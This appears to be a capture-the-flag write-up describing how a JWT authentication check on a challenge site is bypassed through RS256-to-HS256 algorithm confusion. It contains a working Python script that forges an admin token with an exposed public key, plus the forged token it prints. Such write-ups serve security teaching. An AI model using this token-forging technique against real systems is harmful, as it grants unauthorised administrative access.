# [WEB] Unlock Me

## Background

The description given for this challenge was:
```
Our agents discovered COViD's admin panel! They also stole the credentials minion:banana, but it seems that the user isn't allowed in. Can you find another way?
```

<br/>

## Website Analysis

Opening the link shows a simple login page. The first thing I did was to check the source for any HTML comments (they usually contain useful hints).

<img src="screenshots/unlockme-1.jpg" style="border:10px black" caption="Login page from the challenge site." />

<br/>

True enough, there is one comment that says something about `public.pem`. My instinct was to see if the file is available for me to download by visiting `/public.pem`, which was successful:

<img src="screenshots/unlockme-2.jpg" style="border:10px black" caption="Downloading /public.pem was successful." />

<br/>

## Authentication Process

Next, it is time to examine the authentication process. Looking at the source once again:

```js
// Irrelevant code has been filtered

$( "#signinForm" ).submit(function( event ) {
  event.preventDefault();
  fetch("login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({"username": $( "#inputUsername" ).first().val(), "password": $( "#inputPassword" ).first().val() })
  }).then(function(response) {
    return response.json();
  }).then(function(data) {
    if (data.error) {
      $('#alerts').html('<div class="alert alert-danger" role="alert">'+data.error+'</div>');
    } else {
      fetch("unlock", {
        headers: {
          "Authorization": "Bearer " + data.accessToken
        }
      }).then(function(response) {
// ...
```

In this [promise chain](https://javascript.info/promise-chaining) and using [fetch()](https://javascript.info/fetch) to send HTTP requests, once the "Sign In" button was been clicked, the following will occur:
1. Send a `POST` request to `/login` with the parameters `username` and `password` set with the values from the form.
2. JSONify the server's response.
3. If `data.error` exists in the JSON response (`data`), the browser will display it. **Otherwise**, a `GET` request is sent to `/unlock`, adding `data.accessToken` in the [Authorization HTTP header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization): `Authorization: Bearer <data.accessToken>`.

Observe the (un)authentication in action when using the credentials `minion:banana`:

<img src="screenshots/unlockme-3.jpg" style="border:10px black" caption="Attempting to login with the given credentials." />

<br/>

I recognized that the `data.accessToken` is actually a [JWT web token](https://jwt.io/).

### JWT Token

I proceeded to use [JWT.io](https://www.jwt.io) to decode this token and to analyze the payload within:

<img src="screenshots/unlockme-4.jpg" style="border:10px black" caption="Decoded JWT token." />

<br/>

I saw that the username `minion` seems to be valid, but the `role` is set to `user`. It is highly likely that it needs to be `admin` instead. However, even though I could decode the payload easily, I am unable to modify it since the server validates if the JWT token is valid or not. By modifying the payload segment, the signature segment will no longer be valid.

💪 Time to try harder.

## Authentication Bypass

I took a step back and saw that the token uses the `RS256` (RSA w/ SHA256) algorithm, which means that the server might be vulnerable to [**CVE-2016–10555**](https://nvd.nist.gov/vuln/detail/CVE-2016-10555). In essence, this vulnerability allows the `RS256` algorithm to be substituted with the `HS256` (HMAC w/ SHA256) algorithm, and the payload to be signed with the original RSA public key (instead of the private key on the server-end). This means that I can **forge** JWT tokens containing payloads and valid signatures.

Since I have obtained the public key earlier on: 

```bash
# public.pem

-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA4Cot1mM0eF5cZUnifKx0
8MJQ59ui9/8DLzWpWWtlPGsB4T9UsaAspndZJafbGFq0v+vGzG+TltJjb1v+tTj8
sqFanc/KWdQZr3WwmuhU95EJ7RRhtEIxTN8Rn1KOKUqZ/Plmf4LrMrMZm66DqaTW
H2my5IRShK0i0YpziT9JEeVJtS/zC+UUdbImrOavjD4PDZv14FLEuePMN0mCNcQ5
z5iSQv5j8npbtvMBbeAKMvYyCeIchjW22Dp/tNi4xfI7CaTyPp0pO3+MZ9vJ8O02
YOC7/+tQX2NdveVuKYEg4XTQ/nmiYSK9DeXyO/EGkQzxZjpLv5ZMN07Nau2xpQoG
1Ip4YfDA5Y/MjA8qDgNN0n/pmBaPBHNvFK6mWJllnuOnLpQHCxZNxBudxTLSoXkq
XQPRKcdZpbv0kjt/ZpwkoXHfQLToJyZQgQXtEHaW36Ko9Xjq3cDWzkSjADMxaq/5
8SZvPUknm3Mv9KN8zYiePYGUl2aLyKumKF++rlh7a6xJgcBcs10bf0yyeRU3NWWb
0pz4dgdrgh2sXrg/U51VhejnNfvfRf+4Cy1QM4QWbKXZk9sLtLpkfiou/ri3YUn3
txIgfYKa7a5tOtBWSRHHlHOmS58Ab51pmSGdjIeCa+WMie0i5reuRb6WJ27jnvJF
G0hytABBbCgeL00ymJK16tUCAwEAAQ==
-----END PUBLIC KEY-----
```

I would be able to forge a JWT token that sets the `role` to `admin`! In order to do so, I used the following Python script (requires [pyJWT](https://pyjwt.readthedocs.io/en/stable/)):

```py
# gen.py

import jwt

key = open("public.pem").read()
encoded = jwt.encode(
    {
        "username": "minion",
        "role": "admin",
        "iat": 1607241406
    },
  key,
  algorithm='HS256')

print "JWT Token: {}".format(encoded)
```

Running it spawns a token:
```bash
$ python gen.py
JWT Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsImlhdCI6MTYwNzI0MTQwNiwicm9sZSI6ImFkbWluIn0.EpTg1WqcMWon0KGb9Hw1onJ4gBO5QGA41YVmUmKhXZY
```

Using this generated JWT token in-place of the original one, I sent a `GET` request to `/unlock`:

<img src="screenshots/unlockme-5.jpg" style="border:10px black" caption="Logging in with the generated JWT token." />

<img src="screenshots/unlockme-6.jpg" style="border:10px black" caption="Logging in with the generated JWT token." />

<br/>

Which gave me the flag for this challenge:
```
govtech-csg{5!gN_0F_+h3_T!m3S}
```